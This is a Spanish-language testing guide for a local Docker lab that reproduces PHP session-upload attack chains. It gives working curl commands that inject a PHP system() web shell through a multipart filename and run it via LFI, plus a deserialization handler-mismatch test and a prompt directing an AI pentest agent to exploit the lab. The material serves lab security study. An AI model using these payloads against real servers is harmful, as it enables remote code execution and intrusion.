# Guía de testing — PHP2Shell Lab

Esta guía proporciona **pruebas prácticas** paso a paso para verificar cada cadena de ataque reproducible en el lab.

> **NOTA SOBRE EXPLOITS:** El directorio `exploits/` contiene scripts ejecutables completos para cada cadena de ataque. Este directorio está **gitignoreado por defecto** y no debe ser versionado. Para más información sobre los exploits disponibles, consulta `exploits/README.md`.

---

## Pre-requisitos

1. **Lab arrancado:**
   ```bash
   cd labs/php2shell-lab
   docker compose up -d
   ```

2. **Verificar que los contenedores están arriba:**
   ```bash
   docker ps --filter "name=php2shell"
   ```
   Deberías ver 3 contenedores: `php2shell-nginx`, `php2shell-fpm`, `php2shell-apache`.

3. **Confirmar versión vulnerable:**
   ```bash
   curl -s http://127.0.0.1:18080/index.php
   ```
   Salida esperada:
   ```
   PHP 8.2.34
   SAPI fpm-fcgi
   upload_progress 1
   OK
   ```
   Verifica que la versión es `< 8.2.35` y que `upload_progress` es `1`.

---

## Test 1: Chain A — Session File Injection + LFI → RCE

**Objetivo:** conseguir ejecución de comandos inyectando código PHP en el filename de un upload multipart y luego incluyendo el fichero de sesión vía LFI.

### Usando el exploit automatizado

El directorio `exploits/` contiene scripts completos que implementan cada cadena de ataque. **Este directorio está gitignoreado y no debe ser versionado.**

```bash
# Ejecutar exploit de Chain A
python3 exploits/exploit_chain_a.py http://127.0.0.1:18080 "id"
```

**Resultado esperado:** la salida debe contener la ejecución de `id` (ej. `uid=33(www-data)`).

### Verificación manual con curl (sin exploit script):

```bash
# Paso 1: POST multipart con payload en filename
SID="chainAtest000000000000000000"
curl -X POST http://127.0.0.1:18080/index.php \
  -H "Cookie: PHPSESSID=$SID" \
  -F "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F 'f=@-;filename="<?php system($_GET['"'"'c'"'"']); ?>"' <<< "dummy"

# Paso 2: GET al LFI con el comando
curl -s "http://127.0.0.1:18080/vuln.php?page=/tmp/sessions/sess_${SID}&c=id"
```

**Criterio de éxito:** aparece la salida de `id` en la respuesta de `/vuln.php`.

---

## Test 2: Chain C — Handler Mismatch → `__destruct`

**Objetivo:** escribir un objeto serializado con handler `php_serialize` (que preserva pipes) y leerlo con handler `php` (que interpreta pipe como separador), disparando deserialización y `__destruct`.

### Usando el exploit automatizado

```bash
# Ejecutar exploit de Chain C (requiere LFI)
python3 exploits/exploit_chain_c.py http://127.0.0.1:18080 "whoami"
```

### Verificación manual (sin exploit script):

```bash
#!/bin/bash
SID="chainCtest000000000000000000"

echo "[*] Chain C: Handler mismatch test"
echo "[1] Escribiendo con php_serialize (preserva pipe)..."

# Paso 1: POST a /app/upload.php (handler php_serialize)
curl -s -X POST http://127.0.0.1:18080/app/upload.php \
  -H "Cookie: PHPSESSID=$SID" \
  -F "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F 'f=@-;filename="x|O:8:\"stdClass\":0:{}"' <<< "dummy" > /dev/null

echo "[2] Inspeccionando fichero de sesión (desde dentro del contenedor)..."
docker exec php2shell-fpm cat /tmp/sessions/sess_${SID} 2>/dev/null | head -5

echo "[3] Leyendo con handler php (interpreta pipe)..."
# Paso 2: GET/POST a /api/endpoint.php (handler php)
curl -s -X POST http://127.0.0.1:18080/api/endpoint.php \
  -H "Cookie: PHPSESSID=$SID" \
  -d "dummy=data"

echo "[4] Comprobando logs de PHP para warnings de deserialización..."
docker logs php2shell-fpm --tail 20 2>&1 | grep -i "session\|unserialize\|destruct" || echo "(No warnings visibles)"
```

Guarda como `test_chain_c.sh`, dale permisos de ejecución (`chmod +x test_chain_c.sh`) y ejecuta:
```bash
./test_chain_c.sh
```

**Resultado esperado:**
- El fichero de sesión contiene `x|O:8:\"stdClass\":0:{}` en el campo `name`.
- Al leerlo con handler `php`, se dispara deserialización (puede generar warning si `display_errors=On`).
- Con un gadget real (clase con `__destruct`), esto llevaría a RCE. El lab usa `stdClass` como demo, que no tiene destructor explotable pero confirma la mecánica.

---

## Test 3: Chain D — Apache mod_php OOM → RCE

**Objetivo:** disparar OOM en el startup de Apache mod_php enviando headers o body masivos, dejando el executor en estado corrupto.

### Usando el exploit automatizado

```bash
# Ejecutar exploit de Chain D (Apache mod_php con memory_limit bajo)
python3 exploits/exploit_chain_d.py http://127.0.0.1:18081 "id"
```

**Resultado esperado:**
- Primera request: timeout o conexión cerrada por OOM.
- Segunda request: puede mostrar comportamiento anómalo (error 500, respuesta corrupta, o en casos extremos, explotación real si hay un gadget en el shutdown path).

**Nota:** Chain D es la más peligrosa porque **no necesita vulnerabilidad de aplicación**. El PoC completo de RCE está en el repo `ikow/php2shell-poc` (no incluido aquí por seguridad).

**Resultado esperado:**
- Primera request: timeout o conexión cerrada por OOM.
- Segunda request: puede mostrar comportamiento anómalo (error 500, respuesta corrupta, o en casos extremos, explotación real si hay un gadget en el shutdown path).

**Nota:** Chain D es la más peligrosa porque **no necesita vulnerabilidad de aplicación**. El PoC completo de RCE está en el repo `ikow/php2shell-poc` (no incluido aquí por seguridad).

---

## Test 4: Verificación manual desde Vulnerator

Si estás usando Vulnerator/Hermes para explotar el lab, usa este prompt (adaptado para **dentro del contenedor Kali** de Vulnerator):

```
Engagement de EXPLOTACION en modo CTF contra un lab LOCAL AUTORIZADO. Target: http://host.docker.internal:18080 (nginx delante de PHP-FPM 8.2.34, SAPI fpm-fcgi). Entorno de laboratorio controlado, localhost, todo autorizado. Objetivo: conseguir RCE reproduciendo la CADENA A de PHP2Shell (CVE-2026-109618 / CVE-2026-109619) y como prueba de concepto ejecutar `id` en el servidor.

[...resto del prompt del CHAINS.md para Chain A...]

SCOPE: LAB CTF LOCAL AUTORIZADO. Objetivo unico: http://host.docker.internal:18080 (nginx -> php-fpm 8.2.34). Backend php-fpm en host.docker.internal:9000, save_path de sesiones = /tmp/sessions dentro del contenedor php2shell-fpm. Prohibido cualquier host fuera de host.docker.internal.
```

**Nota:** desde el contenedor Kali de Vulnerator, usar `host.docker.internal` en lugar de `127.0.0.1` para alcanzar el lab del host.

---

## Troubleshooting

### Problema: curl devuelve respuesta vacía desde Kali/contenedor

**Causa:** `127.0.0.1` dentro de un contenedor Docker es el propio contenedor, no el host.

**Solución:** usa `host.docker.internal` en lugar de `127.0.0.1` cuando ejecutes comandos desde dentro de un contenedor:
```bash
curl http://host.docker.internal:18080/index.php
```

### Problema: fichero de sesión no persiste (Chain A)

**Causa:** `session.upload_progress.cleanup=On` (default de PHP).

**Verificación:** el lab ya tiene `cleanup=Off` en `php.ini` y `php-apache.ini`. Confirma:
```bash
docker exec php2shell-fpm php -i | grep upload_progress.cleanup
```
Salida esperada: `session.upload_progress.cleanup => Off => Off`.

### Problema: LFI no ejecuta el payload

**Causa 1:** path incorrecto. El save_path es `/tmp/sessions` **dentro del contenedor**, no del host.

**Causa 2:** el payload PHP en el filename tiene comillas mal escapadas.

**Solución:** usar comillas simples o escaping correcto en el boundary multipart. El script Python de ejemplo maneja esto correctamente.

### Problema: Chain C no dispara deserialización

**Causa:** el PHP built-in server ignora `.user.ini`. Este lab usa nginx → php-fpm, que sí respeta `.user.ini`.

**Verificación:** confirma que `/app/` y `/api/` tienen `.user.ini` con handlers distintos:
```bash
docker exec php2shell-fpm cat /var/www/html/app/.user.ini
docker exec php2shell-fpm cat /var/www/html/api/.user.ini
```

---

## Limpieza tras testing

```bash
# Parar y eliminar contenedores
docker compose down

# Opcional: eliminar imágenes descargadas
docker rmi php:8.2.34-fpm php:8.2.34-apache nginx:alpine
```

---

**Para uso exclusivo en entornos de CTF local autorizado. No ejecutar contra sistemas externos.**
